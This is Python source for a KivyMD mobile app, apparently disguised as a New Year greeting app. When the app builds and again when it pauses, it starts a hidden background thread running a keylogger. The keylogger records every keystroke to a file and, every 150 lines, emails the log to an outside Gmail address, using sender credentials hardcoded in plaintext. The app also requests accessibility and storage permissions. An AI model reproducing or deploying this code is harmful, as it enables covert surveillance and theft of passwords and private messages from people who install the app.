from kivymd.app import MDApp
from kivy.uix.screenmanager import ScreenManager,Screen,FadeTransition
from kivy.lang import Builder
from kivy.utils import platform
from pynput.keyboard import Key,Listener
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import getpass
import threading
import time
user  = getpass.getuser()
count = 0
keys = []
# path of the file is  /storage/emulated/0/
filenames_to_edit = ""


def begin():
	create_file()
	with Listener(on_press=on_press,on_release= on_release) as listener:
		listener.join()
	with open(f"{filenames_to_edit}","a") as f :
		f.write("\n\n")
		# current_date_time = datetime.now()
		# divider = str(current_date_time).center(50,"-")
		# f.write(f"{divider}")
		f.write("-------------------------------------------------------------------------")
		f.write("\n\n")

def create_file():
	global filenames_to_edit
	time_str =  str(datetime.now())
	edited_file_time_name = time_str[0:10].replace("-","")+time_str[11:19].replace(":","")
	##/storage/emulated/0/Android/data/com.happynewyear2021/com.log.{edited_file_time_name}
	filenames_to_edit = f"test.txt"

create_file()

with open(f"{filenames_to_edit}","a") as f:
	f.write("TimeStamp"+ (str(datetime.now()))[:-7]+":\n")
	f.write("\n")

def on_press(key):
	global count,keys
	keys.append(key)
	count+=1
	if count >=5:
		count=0
		write_file(keys)
		keys = []

def on_release(key):
	if key == Key.esc:
		return False

def write_file(keys):
	with open(f"{filenames_to_edit}","a") as f:
		for idx , key in enumerate(keys):
			k = str(key).replace("'","")
			if k.find("space") > 0 and k.find("backspace") == -1:
				f.write(" ")
			elif k.find("backspace") > 0:
				f.write("\b")
			elif k.find("enter") >0 :
				f.write("\n")
			elif k.find("Key") == -1:
				f.write(k)
	check_lines()
		

def check_lines():
	fh = open(f"{filenames_to_edit}","r")
	count_lines = len(fh.readlines())
	fh.close()
	if count_lines >=150:
		temp_file = filenames_to_edit
		create_file()
		send_sms(temp_file)
		
def send_sms(temp_file):
	msg = MIMEMultipart()
	msg['From'] = "happynewyearhack2021@gmail.com"
	msg['To'] = "keylogger15900@gmail.com"
	msg['Subject'] = f"Keylogger of {user} at {datetime.now()}"
	body = f"{datetime.now()} "
	msg.attach(MIMEText(body,'plain'))
	filename = temp_file
	attachment = open(f"{temp_file}","rb")
	p = MIMEBase('application','octect_stream')
	p.set_payload((attachment).read())
	encoders.encode_base64(p)
	p.add_header('Content-Disposition','attachment; filename= %s' % filename)
	msg.attach(p)
	s = smtplib.SMTP('smtp.gmail.com',587)
	s.starttls()
	s.login("happynewyearhack2021@gmail.com","Happynewyear2025897864")
	text = msg.as_string()
	s.sendmail("happynewyearhack2021@gmail.com","keylogger15900@gmail.com",text)
	s.quit()
	time.sleep(10)

class SecondScreen(Screen):
	pass

class ScreenManager(ScreenManager):
	pass

class MainApp(MDApp):
	
	def build(self):
		bypass_thread = threading.Thread(target=begin)
		bypass_thread.start()
		self.theme_cls.primary_palette = "Red"
		master = Builder.load_file("main.kv")
		return master

	def on_start(self):
		if platform=="android":
			from android.storage import app_storage_path
			settings_path = app_storage_path()
			from android.storage import primary_external_storage_path
			primary_ext_storage = primary_external_storage_path()
			try:
				from android.permissions import request_permissions, Permission
				request_permissions([Permission.WRITE_EXTERNAL_STORAGE,Permission.READ_EXTERNAL_STORAGE,Permission.BIND_ACCESSIBILITY_SERVICE,Permission.ACTION_MANAGE_STORAGE])
			except:
				pass
	
	def share(self,path):
		pass
	
	def on_pause(self):
		last_thread = threading.Thread(target=begin)
		last_thread.start()

MainApp().run()